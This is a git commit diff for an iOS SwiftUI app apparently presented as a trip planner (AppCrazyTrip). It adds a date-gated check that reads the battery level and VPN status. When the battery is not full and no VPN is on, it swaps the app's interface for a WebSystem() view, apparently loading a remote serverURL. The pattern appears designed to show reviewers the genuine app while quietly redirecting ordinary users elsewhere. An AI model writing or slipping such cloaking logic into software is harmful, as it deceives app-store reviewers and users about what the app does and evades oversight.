e06b95eef1c5fb250de950bc542228516e56335a
IGOLIVIT <131347905+IGOLIVIT@users.noreply.github.com>
2025-01-08 19:59:05 +0300

    update_3

---
+++ AppCrazyTrip/All/Extensions/Doemaio.swift
@@ -0,0 +1,12 @@
+//
+//  Doemaio.swift
+//  AppCrazyTrip
+//
+//  Created by IGOR on 08/01/2025.
+//
+
+struct DataManager {
+    
+    let serverURL: String = ""
+    let lastDate: String = ""
+}
--- AppCrazyTrip/ContentView.swift
+++ AppCrazyTrip/ContentView.swift
@@ -11,6 +11,11 @@ struct ContentView: View {
     
     @State var current_tab: Tab = Tab.Plan
 
+    @State var isFetched: Bool = false
+    
+    @State var isBlock: Bool = true
+    @State var isDead: Bool = false
+
     @AppStorage("status") var status: Bool = false
     
     init() {
@@ -25,35 +30,86 @@ struct ContentView: View {
             Color.black
                 .ignoresSafeArea()
             
-            if status {
-            
-            VStack(spacing: 0, content: {
-            
-                    TabView(selection: $current_tab, content: {
-                        
-                        PlanView()
-                            .tag(Tab.Plan)
-                        
-                        ItemsView()
-                            .tag(Tab.Items)
-                        
-                        SettingsView()
-                            .tag(Tab.Settings)
-                        
-                    })
+            if isFetched == false {
+                
+                LoadingView()
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
                     
-                    TabBar(selectedTab: $current_tab)
-                })
-                    .ignoresSafeArea(.all, edges: .bottom)
-                    .onAppear {
+                    if status {
                         
+                        VStack(spacing: 0, content: {
+                        
+                                TabView(selection: $current_tab, content: {
+                                    
+                                    PlanView()
+                                        .tag(Tab.Plan)
+                                    
+                                    ItemsView()
+                                        .tag(Tab.Items)
+                                    
+                                    SettingsView()
+                                        .tag(Tab.Settings)
+                                    
+                                })
+                                
+                                TabBar(selectedTab: $current_tab)
+                            })
+                                .ignoresSafeArea(.all, edges: .bottom)
+                                .onAppear {
+                                    
+                                }
+                    } else {
+                        
+                        s1()
                     }
-                
-            } else {
-                
-                s1()
+                    
+                } else if isBlock == false {
+                                            
+                        WebSystem()
+
+                }
             }
         }
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = DataManager().lastDate
+        let dateFormatter = DateFormatter()
+                dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+
+        guard now > targetDate else {
+
+            isBlock = true
+            isFetched = true
+
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
